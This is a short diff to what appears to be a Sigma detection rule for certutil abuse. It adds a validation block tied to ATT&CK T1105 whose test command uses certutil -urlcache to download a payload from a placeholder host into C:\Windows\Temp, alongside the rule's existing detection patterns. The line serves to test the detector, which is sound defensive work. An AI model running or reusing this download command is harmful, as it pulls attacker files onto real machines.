@@ -22,6 +22,10 @@ detection:
       - 'decode'
       - '-f http'
   condition: selection and abuse
+validation:
+  atomic: T1105
+  fire: |-
+    certutil.exe -urlcache -split -f http://<host>/payload.txt C:\Windows\Temp\p.txt
 falsepositives:
   - Certificate maintenance scripts, which rarely use urlcache
 level: high
